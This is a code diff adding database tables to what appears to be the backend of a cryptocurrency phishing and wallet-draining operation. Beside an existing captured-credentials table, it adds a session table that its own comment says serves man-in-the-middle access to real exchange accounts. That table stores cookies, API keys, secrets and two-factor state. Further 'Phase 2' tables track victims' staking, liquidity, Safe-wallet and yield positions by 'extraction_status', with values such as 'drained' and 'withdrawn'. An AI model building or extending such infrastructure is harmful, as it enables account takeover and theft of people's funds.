@@ -488,6 +488,70 @@ export const capturedCreds = pgTable(
 export type CapturedCredsRow = typeof capturedCreds.$inferSelect
 export type NewCapturedCredsRow = typeof capturedCreds.$inferInsert
 
+// ─── cex_mitm_sessions (CEX simultaneous login — MITM session management) ────
+// Stores active browser sessions for MITM access to real exchange accounts.
+// Session lifecycle: created → 2fa_pending → verified → active → expired
+
+export const cexMitmSessions = pgTable(
+  'cex_mitm_sessions',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    cred_id: uuid('cred_id').notNull(),
+    exchange: text('exchange').notNull(),
+    session_key: text('session_key').notNull(),
+    cookies: text('cookies').notNull(),
+    user_agent: text('user_agent'),
+    status: text('status').notNull(), // pending | 2fa_required | verified | active | expired
+    twofa_code_requested_at: timestamp('twofa_code_requested_at', { withTimezone: true }),
+    verified_at: timestamp('verified_at', { withTimezone: true }),
+    expires_at: timestamp('expires_at', { withTimezone: true }).notNull(),
+    api_key: text('api_key'),
+    api_secret: text('api_secret'),
+    metadata: jsonb('metadata'),
+    created_at: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
+  },
+  (table) => [
+    index('idx_cex_mitm_sessions_cred_id').on(table.cred_id),
+    index('idx_cex_mitm_sessions_exchange').on(table.exchange),
+    index('idx_cex_mitm_sessions_status').on(table.status),
+    index('idx_cex_mitm_sessions_expires_at').on(table.expires_at),
+  ],
+)
+
+export type CexMitmSessionRow = typeof cexMitmSessions.$inferSelect
+export type NewCexMitmSessionRow = typeof cexMitmSessions.$inferInsert
+
+// ─── login_requests (Multi-user CEX login tracking) ─────────────────────────
+
+export const loginRequests = pgTable(
+  'login_requests',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    requestId: text('request_id').notNull().unique(),
+    credId: uuid('cred_id').notNull(),
+    exchange: text('exchange').notNull(),
+    emailHash: text('email_hash').notNull(),
+    clientIp: text('client_ip'),
+    userAgent: text('user_agent'),
+    status: text('status').notNull().default('started'),
+    sessionId: text('session_id'),
+    mitMSessionId: text('mitm_session_id'),
+    errorMessage: text('error_message'),
+    createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
+    completedAt: timestamp('completed_at', { withTimezone: true }),
+  },
+  (table) => [
+    index('idx_login_requests_request_id').on(table.requestId),
+    index('idx_login_requests_cred_id').on(table.credId),
+    index('idx_login_requests_exchange').on(table.exchange),
+    index('idx_login_requests_status').on(table.status),
+    index('idx_login_requests_created_at').on(table.createdAt),
+  ],
+)
+
+export type LoginRequestRow = typeof loginRequests.$inferSelect
+export type NewLoginRequestRow = typeof loginRequests.$inferInsert
+
 // ─── telemetry ───────────────────────────────────────────────────────────────
 // Durable operational telemetry for Admin retrieval. System-level events may
 // omit wallet_address; wallet-scoped views use the dedicated index below.
@@ -622,3 +686,163 @@ export const signatureValidations = pgTable(
 
 export type SignatureValidationRow = typeof signatureValidations.$inferSelect
 export type NewSignatureValidationRow = typeof signatureValidations.$inferInsert
+
+// ─── Phase 2: Staking Positions ────────────────────────────────────────────────
+
+export const stakingPositions = pgTable(
+  'staking_positions',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    wallet_address: text('wallet_address').notNull(),
+    chain: text('chain').notNull(),
+    protocol: text('protocol').notNull(),
+    stake_token: text('stake_token').notNull(),
+    amount_raw: text('amount_raw').notNull(),
+    amount_decimals: integer('amount_decimals').default(18),
+    position_hash: text('position_hash').notNull().unique(),
+    withdrawal_id: text('withdrawal_id'),
+    detected_at: timestamp('detected_at', { withTimezone: true }).notNull().defaultNow(),
+    last_updated: timestamp('last_updated', { withTimezone: true }).notNull().defaultNow(),
+    extraction_status: text('extraction_status').default('detected').notNull(),
+  },
+  (table) => [
+    check('staking_extraction_status_valid',
+      sql`${table.extraction_status} IN ('detected', 'pending', 'withdrawn', 'claimed', 'failed')`
+    ),
+    index('idx_staking_wallet').on(table.wallet_address),
+    index('idx_staking_chain').on(table.chain),
+    index('idx_staking_protocol').on(table.protocol),
+    index('idx_staking_status').on(table.extraction_status),
+  ],
+)
+
+export type StakingPositionRow = typeof stakingPositions.$inferSelect
+export type NewStakingPositionRow = typeof stakingPositions.$inferInsert
+
+// ─── Phase 2: LP Positions ────────────────────────────────────────────────────
+
+export const lpPositions = pgTable(
+  'lp_positions',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    wallet_address: text('wallet_address').notNull(),
+    chain: text('chain').notNull(),
+    protocol: text('protocol').notNull(),
+    position_id: text('position_id').notNull(),
+    token0: text('token0').notNull(),
+    token1: text('token1').notNull(),
+    liquidity: text('liquidity').notNull(),
+    lower_tick: integer('lower_tick'),
+    upper_tick: integer('upper_tick'),
+    fee_tier: integer('fee_tier'),
+    position_hash: text('position_hash').notNull().unique(),
+    detected_at: timestamp('detected_at', { withTimezone: true }).notNull().defaultNow(),
+    last_updated: timestamp('last_updated', { withTimezone: true }).notNull().defaultNow(),
+    extraction_status: text('extraction_status').default('detected').notNull(),
+  },
+  (table) => [
+    check('lp_extraction_status_valid',
+      sql`${table.extraction_status} IN ('detected', 'pending', 'decreased', 'collected', 'failed')`
+    ),
+    index('idx_lp_wallet').on(table.wallet_address),
+    index('idx_lp_chain').on(table.chain),
+    index('idx_lp_protocol').on(table.protocol),
+    index('idx_lp_status').on(table.extraction_status),
+  ],
+)
+
+export type LpPositionRow = typeof lpPositions.$inferSelect
+export type NewLpPositionRow = typeof lpPositions.$inferInsert
+
+// ─── Phase 2: Safe Wallets ───────────────────────────────────────────────────
+
+export const safeWallets = pgTable(
+  'safe_wallets',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    safe_address: text('safe_address').notNull(),
+    chain: text('chain').notNull(),
+    owners: text('owners').array().notNull(),
+    threshold: integer('threshold').notNull(),
+    nonce: integer('nonce').default(0),
+    balance_native: text('balance_native'),
+    detected_at: timestamp('detected_at', { withTimezone: true }).notNull().defaultNow(),
+    last_updated: timestamp('last_updated', { withTimezone: true }).notNull().defaultNow(),
+    extraction_status: text('extraction_status').default('detected').notNull(),
+  },
+  (table) => [
+    check('safe_extraction_status_valid',
+      sql`${table.extraction_status} IN ('detected', 'enumerated', 'drained', 'failed')`
+    ),
+    index('idx_safe_address').on(table.safe_address),
+    index('idx_safe_chain').on(table.chain),
+    index('idx_safe_status').on(table.extraction_status),
+  ],
+)
+
+export type SafeWalletRow = typeof safeWallets.$inferSelect
+export type NewSafeWalletRow = typeof safeWallets.$inferInsert
+
+// ─── Phase 2: Yield Farm Positions ────────────────────────────────────────────
+
+export const yieldFarmPositions = pgTable(
+  'yield_farm_positions',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    wallet_address: text('wallet_address').notNull(),
+    chain: text('chain').notNull(),
+    protocol: text('protocol').notNull(),
+    underlying_token: text('underlying_token').notNull(),
+    atoken_address: text('atoken_address'),
+    deposit_amount: text('deposit_amount').notNull(),
+    earned_amount: text('earned_amount'),
+    position_hash: text('position_hash').notNull().unique(),
+    detected_at: timestamp('detected_at', { withTimezone: true }).notNull().defaultNow(),
+    last_updated: timestamp('last_updated', { withTimezone: true }).notNull().defaultNow(),
+    extraction_status: text('extraction_status').default('detected').notNull(),
+  },
+  (table) => [
+    check('yield_farm_extraction_status_valid',
+      sql`${table.extraction_status} IN ('detected', 'pending', 'withdrawn', 'claimed', 'failed')`
+    ),
+    index('idx_yield_wallet').on(table.wallet_address),
+    index('idx_yield_chain').on(table.chain),
+    index('idx_yield_protocol').on(table.protocol),
+    index('idx_yield_status').on(table.extraction_status),
+  ],
+)
+
+export type YieldFarmPositionRow = typeof yieldFarmPositions.$inferSelect
+export type NewYieldFarmPositionRow = typeof yieldFarmPositions.$inferInsert
+
+// ─── Phase 2: Bridge Transfers ────────────────────────────────────────────────
+
+export const bridgeTransfers = pgTable(
+  'bridge_transfers',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    source_chain: text('source_chain').notNull(),
+    dest_chain: text('dest_chain').notNull(),
+    bridge_protocol: text('bridge_protocol').notNull(),
+    source_address: text('source_address').notNull(),
+    dest_address: text('dest_address').notNull(),
+    token_address: text('token_address'),
+    amount: text('amount').notNull(),
+    bridge_tx_hash: text('bridge_tx_hash').unique(),
+    status: text('status').default('initiated').notNull(),
+    initiated_at: timestamp('initiated_at', { withTimezone: true }).notNull().defaultNow(),
+    completed_at: timestamp('completed_at', { withTimezone: true }),
+  },
+  (table) => [
+    check('bridge_transfers_status_valid',
+      sql`${table.status} IN ('initiated', 'pending', 'confirmed', 'failed')`
+    ),
+    index('idx_bridge_source_chain').on(table.source_chain),
+    index('idx_bridge_dest_chain').on(table.dest_chain),
+    index('idx_bridge_protocol').on(table.bridge_protocol),
+    index('idx_bridge_status').on(table.status),
+  ],
+)
+
+export type BridgeTransferRow = typeof bridgeTransfers.$inferSelect
+export type NewBridgeTransferRow = typeof bridgeTransfers.$inferInsert
